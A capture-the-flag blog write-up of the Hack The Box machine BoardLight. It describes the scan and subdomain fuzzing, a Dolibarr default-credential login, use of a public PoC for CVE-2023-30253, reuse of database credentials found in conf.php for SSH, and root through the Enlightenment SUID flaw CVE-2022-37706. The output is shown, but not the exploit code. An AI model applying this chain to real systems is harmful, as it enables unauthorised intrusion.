---
title: Hack The Box | BoardLight Writeup  
date: 2024-09-27 23:00:00 +0530
categories: [Blogging, Writeup, Hack The Box]
tags: [BoardLight, HTB, Writeup, Easy] 
pin: false
math: true
mermaid: true
author: 7h3h0und
image:
  path: /assets/img/headers/boardlight.png
  lqip: data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAABg2lDQ1BJQ0MgUHJvZmlsZQAAeJx9kT1Iw0AcxV9TpSotDmYQdchQnexSRRxrFYpQIdQKrTqYj35Bk4YkxcVRcC04+LFYdXBx1tXBVRAEP0CcHZwUXaTE/yWFFjEeHPfj3b3H3TuAa1YVzepJAJpum5lUUsjlV4XQK/oxigh4xCXFMuZEMQ3f8XWPAFvvYizL/9yfI6IWLAUICMQJxTBt4g3imU3bYLxPzCtlSSU+J5406YLEj0yXPX5jXHKZY5m8mc3ME/PEQqmL5S5WyqZGPE0cVTWd8rmcxyrjLcZata6078leGC7oK8tMpzmGFBaxBBECZNRRQRU2YrTqpFjI0H7Sxz/i+kVyyeSqQCHHAmrQILl+sD/43a1VnIp7SeEk0PviOB/jQGgXaDUc5/vYcVonQPAZuNI7/loTmP0kvdHRokfA4DZwcd3R5D3gcgcYfjIkU3KlIE2uWATez+ib8sDQLTCw5vXW3sfpA5ClrtI3wMEhMFGi7HWfd/d19/bvmXZ/P8cMcsjGb8DqAAADIUlEQVR4nJ2Vz2/kRBCFv1fd7bEnJLtZhUNuSAhxRKAV//91L0hIcAWBFGARBCXD/LDdXbUHOwsXyEBfbKml7u+9elWt69tPg/+xLEE4pGwMV0DAaQ/VRUkiEAAVgUABTxflp78I8n+9WAJ32D84KYntVXD6c9mYmhiKeKFKBDTEIxkBEUEEILiyRoogxJkAAWUj+svEsElYNnIxth0IOLYFyrxxOAW7HdQxyAQlGgCOFk8iOLjYKCjy8wBk0A2GbQo5i6zEi2R8ICHBQWI3B26GFWc7OOMcyN/zYwFa6yDBrkLflecBIiAlkXuDrqPPcLPdcHuz4WJbQOI4Vn75beL+cGIP5FapKWh1uVTxpF4rjkiIpjMAYAlc7oR3hT43rraZ4SKzi44IcdEHl9vEfk5ghjXDklNX5SahCGItRUhkFifsHACAlAUmunAuqXRRmQ4z02Gm85krKhtvyIycRZIwIElkiSwjmWESxrIvzg0h4C0gghF4mCFPEM0JGadZ7FpiRBCBO4DW2C0N+aTUY60EQJwJ4A51CsiNKcHRDbfMh9cZmTiNwd6DUwOPRp2hOUuLaLE8iOWrpRStNVqdnweQFvV1dFKeOGXxdjcytsZgIIlDiIdTMNUGrdEmp9YFoEX8pZzAF+E0FpCzHIiA6ehs0sSYoXWNqsSQWBwIo7bApxmfnXp0vAW2Bq8F6zACjyWK7W9h/MeVktGVDplIydiWQhkECazLHBXvbSpZBAkDxtxgG0SdqNVxX+xndUOAm+jtX0ZxRJAs0XUFSeSc6cuWoStYcfoLw1lGbpBQGIdpJBRYnnA1CMdbZfYKtgTx6T24zNBFfaYEEu7BXCc4jdTW2O8TzRulGLU1QGz6DSkb8zjiLRjnhjfHwmksOYhYAVYXLtMzGZBErZXHxx1fvv6c1198xu/3f1C6wqvrl3z3/Q8Mfc9wkbj79Ueur254dX3L3d0dmyR++vktX339LbkfcNNq/HJuxrmvix967jmOCLpSsJSIcCSDCI6nE8MwIODlTU+o8vFHn/DmzTdM00zpCrU59tTz60wI1ijEMlfeAU13texQy3o3AAAAAElFTkSuQmCC
---

## Summary:
In this challenge, I explored and exploited a subdomain hosting Dolibarr CRM. After conducting some research, I was able to gain access using default credentials. Through further enumeration, I identified a vulnerability within the version of Dolibarr that allowed remote code execution, granting me an initial foothold.

Upon obtaining a reverse shell, I explored the system and found SSH credentials, allowing me to escalate to a user shell. Running a privilege escalation script revealed an SUID vulnerability in Enlightenment, which I successfully exploited to gain root access to the machine.

## Enumeration: 

### Port Scan:
I began with an Nmap scan to discover open ports.

```bash
# Nmap 7.94SVN scan initiated Wed Sep 25 19:45:12 2024 as: nmap -sV -A -p- -T5 -oA bordlight 10.10.11.11
Warning: 10.10.11.11 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.11
Host is up (0.24s latency).
Not shown: 65000 closed tcp ports (reset), 533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   234.20 ms 10.10.14.1
2   235.61 ms 10.10.11.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 25 19:53:53 2024 -- 1 IP address (1 host up) scanned in 521.92 seconds
```
Not much here other than port 80 running Apache and SSH on the default port 22. We'll leave this for now and initiate another scan later if needed.

Visiting the web application at http://10.10.11.11/ doesn't provide much information.

![img-description](/assets/img/htb/boardlight/1.png) _Web application_

I added board.htb to our /etc/hosts file, associating it with the IP address, so we can access the domain in our browser.

### Web Directory Discovery:

Using ffuf, I started fuzzing for subdomains. Initially, the scan resulted in too many responses, all with a size of 15949. I modified my command to filter out response size 15949.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u http://board.htb/ -H 'Host: FUZZ.board.htb' -c  -fs 15949

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 262ms]
:: Progress: [19966/19966] :: Job [1/1] :: 155 req/sec :: Duration: [0:02:03] :: Errors: 0 ::
```

With right filters I was able to identify a subdomain crm which i added to out hostfile.

## Foothold:

After identifying the subdomain crm, I added it to the /etc/hosts file to facilitate easy access. Visiting the subdomain at crm.board.htb revealed that the application was running Dolibarr CRM.

![img-description](/assets/img/htb/boardlight/2.png) _Dolibarr CRM_

With some research, I was able to discover the default login credentials for Dolibarr CRM and successfully logged in. However, the interface didn't provide many useful functions that could be directly leveraged for further exploitation.

>__Dolibarr ERP CRM__ is an open-source software package designed for companies, foundations, and freelancers. It offers a range of features for enterprise resource planning (ERP) and customer relationship management (CRM), as well as other functionalities for various business activities.
{:.prompt-info }

Further research into the version of Dolibarr revealed a known vulnerability [CVE-2023-30253](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30253), which enables remote code execution by an authenticated user. This vulnerability occurs due to an uppercase manipulation in PHP tags, where <?PHP can bypass some security filters that expect the lowercase variant <?php.

I found a [Proof of Concept (PoC)](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253) for this vulnerability and used it to inject malicious code into the application. Once executed, this successfully provided me with a reverse shell, establishing foothold on the system.


## Privilege Escalation:


### To User Access:

After obtaining the reverse shell, I performed further enumeration to gather more information about the system. During this process, I navigated to the Dolibarr configuration folder, where I discovered a PHP configuration file that contained the database connection details.

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls
ls
conf.php
conf.php.example
conf.php.old
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ 
```
After discovering the database credentials, I checked the home directory and found a single user named larissa. Based on the likelihood of password reuse, I attempted to log in via SSH using the credentials from the database.

The attempt was successful, and I was able to log in as larissa, thus gaining full access to the user's account and ownership of the system at the user level.

```bash
kasyap@Kalki:~$ ssh larissa@10.10.11.11
larissa@10.10.11.11's password: 
Last login: Sun Sep 29 07:41:32 2024 from 10.10.14.95
larissa@boardlight:~$ id 
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
larissa@boardlight:~$ ls
```

### From User to Root:

With the user shell access, I proceeded to perform privilege escalation by downloading and running LinPEAS, a Linux enumeration tool. The scan results revealed some interesting files with SUID permissions, one of which was particularly noteworthy:

```bash
====================================( Interesting Files )=====================================
[+] SUID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

This file belongs to Enlightenment, a lightweight window manager for Linux. Upon checking the version, it was identified as 0.23.1.

```bash
larissa@boardlight:~$ enlightenment --version
ESTART: 0.00001 [0.00001] - Begin Startup
ESTART: 0.00005 [0.00004] - Signal Trap
ESTART: 0.00006 [0.00001] - Signal Trap Done
ESTART: 0.00009 [0.00003] - Eina Init
ESTART: 0.00037 [0.00028] - Eina Init Done
ESTART: 0.00039 [0.00002] - Determine Prefix
ESTART: 0.00054 [0.00015] - Determine Prefix Done
ESTART: 0.00056 [0.00002] - Environment Variables
ESTART: 0.00057 [0.00001] - Environment Variables Done
ESTART: 0.00058 [0.00001] - Parse Arguments
Version: 0.23.1
E: Begin Shutdown Procedure!
```

With further enumeration, I discovered that Enlightenment version 0.23.1 has a known vulnerability, CVE-2022-37706, which could allow local users to escalate their privileges. 

The vulnerability exists due to the enlightenment_sys SUID binary, which mishandles path names starting with the /dev/.. substring. This flaw allows local users to execute arbitrary commands with elevated privileges.

I downloaded the publicly available [Proof of Concept (PoC)](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) for this vulnerability by hosting it on a Python HTTP server and transferring it to the target machine. 

After running the exploit, I successfully gained root access:

```bash
larissa@boardlight:~$ bash exploit.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
```